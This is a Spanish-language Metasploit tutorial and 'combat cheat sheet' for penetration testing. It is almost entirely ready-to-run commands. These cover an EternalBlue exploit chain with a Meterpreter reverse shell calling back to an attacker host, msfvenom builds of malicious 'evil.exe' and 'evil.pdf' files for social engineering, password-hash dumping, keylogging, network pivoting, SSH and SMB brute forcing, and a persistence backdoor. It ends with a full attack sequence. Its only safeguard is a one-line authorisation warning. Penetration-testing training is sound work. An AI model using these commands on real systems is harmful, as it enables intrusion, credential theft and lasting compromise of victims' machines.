Metasploit - Home
-----------------
Framework de explotación y pruebas de penetración líder. Permite descubrir, explotar y validar vulnerabilidades en sistemas y redes.

Metasploit - Introduction
-------------------------
Herramienta de código abierto (y versión comercial) usada por pentesters, red teams y profesionales de ciberseguridad para ejecutar exploits, gestionar payloads, realizar escaneos y más.

Metasploit - Environment Setup
------------------------------
Instalación en Kali Linux:
    sudo apt update && sudo apt install metasploit-framework
Iniciar consola:
    msfconsole

Metasploit - Basic Commands
---------------------------
    help                 → Lista de comandos disponibles
    search <nombre>      → Buscar exploit, payload o módulo
    use <módulo>         → Seleccionar módulo
    show options         → Mostrar opciones configurables
    set <opción> <valor> → Configurar opciones
    run / exploit        → Ejecutar exploit
    sessions             → Listar sesiones abiertas
    sessions -i <id>     → Interactuar con sesión

-------------------------

------------------------

METASPLOIT - CHEAT SHEET DE COMBATE
==========================================

⚠ AVISO:
Usar solo en entornos controlados y con autorización.
El uso no autorizado puede ser ilegal.

==========================================
1. INTRODUCCIÓN
==========================================
Metasploit es un framework para pruebas de penetración, explotación de vulnerabilidades y post-explotación. 
Flujo típico: Descubrimiento → Escaneo → Enumeración → Explotación → Post-Explotación → Persistencia.

Iniciar Metasploit:
    msfconsole

Actualizar:
    msfupdate

==========================================
2. COMANDOS BÁSICOS
==========================================
help                     → Lista de comandos
search <keyword>         → Buscar módulo
use <module_path>        → Cargar módulo
show options             → Ver parámetros
set <option> <value>     → Configurar
run / exploit            → Ejecutar
back                     → Salir de módulo
sessions                 → Listar sesiones
sessions -i <id>         → Interactuar con sesión

==========================================
3. ESCANEO Y ENUMERACIÓN
==========================================
Escaneo con nmap integrado:
    db_nmap -sV -O <IP/RANGO>

Listar hosts detectados:
    hosts

Listar servicios detectados:
    services

Ejemplo:
    db_nmap -p 21,22,80,443 192.168.1.0/24
    hosts
    services

==========================================
4. EXPLOTACIÓN BÁSICA
==========================================
Buscar exploit:
    search exploit/windows/smb

Seleccionar y configurar:
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.1.105
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.1.100
    run

==========================================
5. PAYLOADS
==========================================
Reverse TCP:
    windows/meterpreter/reverse_tcp
Bind TCP:
    windows/meterpreter/bind_tcp

Crear payload manual:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

==========================================
6. POST-EXPLOTACIÓN
==========================================
Meterpreter:
    sysinfo                  → Info del sistema
    getuid                   → Usuario actual
    hashdump                 → Dump de hashes
    screenshot               → Captura de pantalla
    keyscan_start            → Iniciar keylogger
    download <archivo>       → Descargar archivo
    upload <archivo>         → Subir archivo

Pivoting (acceso a red interna):
    run autoroute -s 10.0.0.0/24
    use auxiliary/scanner/portscan/tcp
    set RHOSTS 10.0.0.0/24
    run

==========================================
7. BRUTE FORCE
==========================================
Ejemplo SSH:
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS 192.168.1.105
    set USERPASS_FILE /path/diccionario.txt
    run

Ejemplo SMB:
    use auxiliary/scanner/smb/smb_login
    set RHOSTS 192.168.1.105
    set SMBUser administrator
    set PASS_FILE /path/passwords.txt
    run

==========================================
8. PERSISTENCIA
==========================================
En Windows:
    run persistence -U -i 10 -p 4444 -r <LHOST>

En Linux:
    upload script.sh /tmp/
    execute -f /tmp/script.sh

==========================================
9. ATAQUES DE INGENIERÍA SOCIAL
==========================================
Crear ejecutable malicioso:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > evil.exe

PDF malicioso:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f pdf > evil.pdf

==========================================
10. EXPORTAR Y REPORTAR
==========================================
Exportar hosts:
    hosts -o hosts.csv

Exportar servicios:
    services -o services.csv

==========================================
11. SECUENCIA COMPLETA DE ATAQUE
==========================================
Ejemplo real en laboratorio:

1) Escaneo:
    db_nmap -sV -O 192.168.1.0/24
    hosts
    services

2) Selección de objetivo:
    search exploit/windows/smb/ms17_010_eternalblue
    use exploit/windows/smb/ms17_010_eternalblue

3) Configuración:
    set RHOSTS 192.168.1.105
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.100

4) Ejecución:
    run

5) Post-explotación:
    sessions
    sessions -i 1
    sysinfo
    hashdump
    run autoroute -s 10.0.0.0/24

6) Persistencia:
    run persistence -U -i 10 -p 4444 -r 192.168.1.100
